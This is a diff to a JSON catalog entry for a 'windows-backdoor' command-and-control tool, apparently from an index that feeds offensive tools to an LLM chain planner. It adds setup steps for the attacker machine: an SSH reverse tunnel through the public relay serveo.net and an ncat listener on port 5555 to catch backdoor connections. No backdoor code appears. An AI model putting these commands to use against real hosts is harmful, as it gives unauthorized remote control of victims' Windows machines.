@@ -9,7 +9,13 @@
   "summary": "Python Backdoor for Windows On Public Networks",
   "documentation": {
     "readme": "Python Backdoor for Windows On Public Networks",
-    "usage_sections": [],
+    "usage_sections": [
+      "To get this to working a Tool must be installed on YOUR PC (attacker PC)",
+      "This one commad is enough to set up ncat on linux",
+      "Go to Nmap official site https://nmap.org/download.html#windows",
+      "Download nmap installer and run it.",
+      "CHECK Ncat at this window"
+    ],
     "arguments": [
       {
         "name": "-R",
@@ -187,7 +193,10 @@
         "source": "v2_enhancement"
       }
     ],
-    "examples": [],
+    "examples": [
+      "ssh -R 61732:localhost:5555 serveo.net",
+      "ncat -lnvp 5555 #the same local port that you specified in ssh command"
+    ],
     "file_listing": [
       "README.md",
       "script.py"
@@ -239,13 +248,9 @@
         "score": 1
       }
     ],
-    "when_to_use": "Use this tool when the engagement is in the 'post_exploit' phase against a target with '['web', 'shell_windows', 'shell_linux']' as the attack surface (command_and_control, toolbox, github).",
-    "why_to_use": "This tool is preferred because: Index entry in the Command and Control category. Use as a candidate tool in the chain planner after a NVD/lookup pass on the target vendor.",
-    "how_to_use": [
-      "Step 1: cd toolboxes/windows-backdoor && python3 windows-backdoor.py --help",
-      "Step 2: cd toolboxes/windows-backdoor && cat README.md",
-      "Step 3: cd toolboxes/windows-backdoor && ls -la"
-    ]
+    "when_to_use": "Use during the 'post_exploit' phase against surfaces [web, shell_windows, shell_linux] in the Command and Control category. Fits when the engagement needs: Python Backdoor for Windows On Public Networks.",
+    "why_to_use": "Prefer this tool based on upstream description: Python Backdoor for Windows On Public Networks.",
+    "how_to_use": "Run the primary entrypoint as shown in upstream docs, e.g. `ssh -R 61732:localhost:5555 serveo.net`. Further invocations from upstream: `ncat -lnvp 5555 #the same local port that you specified in ssh command`. Python Backdoor for Windows On Public Networks."
   },
   "metadata_status": "enriched",
   "trust": {
@@ -277,18 +282,16 @@
     "target-adaptive"
   ],
   "use_cases": [
-    "Index entry in the Command and Control category. Use as a candidate tool in the chain planner after a NVD/lookup pass on the target vendor.",
-    "Pairs with the Command and Control system-prompt stanza in core.ai_backend.chain to teach the LLM the standard invocation pattern.",
-    "Operator-initiated: the chain step is gated by the per-step ACCEPT/CANCEL gate; the tool does not auto-execute.",
-    "Use as a reference implementation when designing a new v3 method for this category.",
-    "Use as a teaching example in the prompt stanza so the LLM can reason about the right run order."
+    "When you need Command and Control, use windows-backdoor because Python Backdoor for Windows On Public Networks.",
+    "When the engagement is in the post_exploit phase, use windows-backdoor as a cataloged Command and Control tool with operator ACCEPT/CANCEL gating.",
+    "When you need a concrete invocation, run `ssh -R 61732:localhost:5555 serveo.net` as documented upstream for windows-backdoor.",
+    "When you need a concrete invocation, run `ncat -lnvp 5555 #the same local port that you specified in ssh command` as documented upstream for windows-backdoor.",
+    "When chaining Command and Control tools, pair windows-backdoor with sibling catalog entries sharing its attack_surface/phase_hint.",
+    "When validating lab setup, run `windows-backdoor --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
   ],
   "command_examples": [
-    "cd toolboxes/windows-backdoor && python3 windows-backdoor.py --help",
-    "cd toolboxes/windows-backdoor && cat README.md",
-    "cd toolboxes/windows-backdoor && ls -la",
-    "cd toolboxes/windows-backdoor && python3 windows-backdoor.py --target $KFIOSA_TARGET_HOST",
-    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST windows-backdoor --output $KFIOSA_OUTPUT_DIR/windows-backdoor.log"
+    "ssh -R 61732:localhost:5555 serveo.net",
+    "ncat -lnvp 5555 #the same local port that you specified in ssh command"
   ],
   "attack_surface": [
     "web",
@@ -311,5 +314,7 @@
   "_kfiosa_enriched_at": "phase4_t16",
   "_languages": [
     "python"
-  ]
+  ],
+  "_kfiosa_enhanced_v3": true,
+  "_enhanced_via": "local_readme"
 }
